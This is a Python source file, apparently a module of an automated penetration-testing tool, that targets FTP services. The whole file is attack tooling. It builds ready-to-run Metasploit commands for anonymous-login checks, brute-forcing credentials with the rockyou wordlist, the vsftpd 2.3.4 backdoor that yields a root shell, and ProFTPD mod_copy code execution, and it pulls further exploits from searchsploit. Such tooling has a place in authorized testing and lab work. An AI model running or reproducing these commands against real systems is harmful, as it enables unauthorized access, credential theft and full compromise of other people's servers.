"""
FTP Exploit Module — Port 21
Techniques: Anonymous login, brute force, known CVE exploits
"""
import subprocess

MODULE_INFO = {
    "port": 21,
    "service": "ftp",
    "name": "FTP Exploit Module",
    "description": "Attempts anonymous login, credential brute force, and known FTP vulnerabilities",
    "author": "Custom",
    "mitre": ["T1078", "T1110", "T1190"],
    "techniques": [
        {"id": "T1078", "name": "Valid Accounts", "tactic": "Initial Access"},
        {"id": "T1110", "name": "Brute Force", "tactic": "Credential Access"},
    ],
}

EXPLOITS = [
    {
        "name": "FTP Anonymous Login Check",
        "source": "custom",
        "type": "auxiliary",
        "msf_module": "auxiliary/scanner/ftp/anonymous",
        "description": "Checks if FTP allows anonymous login — a critical misconfiguration",
        "exec_command": "msfconsole -q -x 'use auxiliary/scanner/ftp/anonymous; set RHOSTS {target}; run; exit'",
        "risk": "High — anonymous access may expose sensitive files",
    },
    {
        "name": "FTP Brute Force",
        "source": "metasploit",
        "type": "auxiliary",
        "msf_module": "auxiliary/scanner/ftp/ftp_login",
        "description": "Attempts credential brute force against the FTP service",
        "exec_command": "msfconsole -q -x 'use auxiliary/scanner/ftp/ftp_login; set RHOSTS {target}; set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt; set PASS_FILE /usr/share/wordlists/rockyou.txt; run; exit'",
        "risk": "Medium — weak credentials enable unauthorized file access",
    },
    {
        "name": "vsftpd 2.3.4 Backdoor",
        "source": "metasploit",
        "type": "exploit",
        "msf_module": "exploit/unix/ftp/vsftpd_234_backdoor",
        "description": "Exploits the infamous vsftpd 2.3.4 backdoor for remote root shell",
        "exec_command": "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {target}; run; exit'",
        "risk": "Critical — gives full root access to the system",
    },
    {
        "name": "ProFTPD 1.3.5 mod_copy",
        "source": "metasploit",
        "type": "exploit",
        "msf_module": "exploit/unix/ftp/proftpd_modcopy_exec",
        "description": "Exploits ProFTPD mod_copy to copy files and gain code execution",
        "exec_command": "msfconsole -q -x 'use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS {target}; run; exit'",
        "risk": "Critical — remote code execution via file manipulation",
    },
]


def enumerate(target_ip, service_info=None):
    """Find exploits for FTP. Returns list of exploit dicts."""
    results = []
    product = (service_info or {}).get("product", "").lower()
    version = (service_info or {}).get("version", "")

    # Always include basic checks
    results.append(EXPLOITS[0])  # Anonymous login
    results.append(EXPLOITS[1])  # Brute force

    # Product-specific exploits
    if "vsftpd" in product and "2.3.4" in version:
        results.append(EXPLOITS[2])
    if "proftpd" in product:
        results.append(EXPLOITS[3])

    # Also search searchsploit
    if product and version:
        try:
            r = subprocess.run(
                ["searchsploit", f"{product} {version}", "--json"],
                capture_output=True, text=True, timeout=8,
            )
            if r.returncode == 0:
                import json
                data = json.loads(r.stdout)
                for ex in data.get("RESULTS_EXPLOIT", [])[:3]:
                    results.append({
                        "name": ex.get("Title", "Unknown"),
                        "source": "searchsploit",
                        "type": "exploit",
                        "msf_module": ex.get("Path", ""),
                        "description": f"ExploitDB: {ex.get('Title', '')}",
                        "exec_command": f"searchsploit -m {ex.get('EDB-ID', '')}",
                        "risk": "Varies",
                    })
        except Exception:
            pass

    return results


def exploit(target_ip, port=21, exploit_info=None):
    """Execute the exploit. Returns result dict."""
    if not exploit_info:
        exploit_info = EXPLOITS[0]

    cmd = exploit_info.get("exec_command", "").format(target=target_ip)
    return {
        "command": cmd,
        "module": exploit_info.get("msf_module", ""),
        "status": "ready",
        "target": f"{target_ip}:{port}",
    }
